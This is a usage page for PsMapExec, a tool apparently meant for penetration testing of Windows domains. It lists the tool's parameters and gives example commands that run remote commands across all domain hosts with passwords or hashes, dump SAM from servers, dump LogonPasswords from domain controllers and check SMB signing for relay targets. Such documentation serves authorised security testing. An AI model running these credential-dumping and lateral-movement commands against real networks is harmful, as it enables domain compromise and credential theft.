# General Usage

The general usage of PsMapExec is to define the following:

* Targets - Which targets we cant to run against
* Username - Domain user for which we wish to authenticate against the targets
* Password - Used for authentication
* Hash - Used for authentication. You can supply either a hash or a password.&#x20;
* Method - How to authenticate against the hosts
* Module - (Optional) If any modules need to be run against the target
* Option - (Optional) Provide further commands to select modules
* Command - (Optional) execute commands against the target

Most of these have additional documentation that delves into more detail about each (Available on the lefthand sidebar of this page).

Generally, you can mix and match various parameters across different methods and modules.

## Examples

Execute WMI commands over all systems in the domain using password authentication

```
PsMapExec -Username Admin -Password Pass -Targets All -Method WMI -Command "net user"
```

Execute WinRM commands over all systems in the domain using hash authentication

```
PsMapExec -Username Admin -Hash [Hash] -Targets All -Method WinRM -Command "net user"
```

Check RDP Access against workstations in the domain

```
PsMapExec -Username Admin -Password Pass -Targets Workstations -Method RDP
```

Dump SAM on all servers in the domain using PsExec

```
PsMapExec -Username Admin -Hash [Hash] -Targets Servers -Method PsExec -Module SAM
```

Check SMB Signing on all domain systems

```
PsMapExec -Targets All -GenRelayList
```

Dump LogonPasswords on all Domain Controllers over WinRM

```
PsMapExec -Username Admin -Password Pass -Targets DCs -Method WinRM -Module LogonPasswords
```
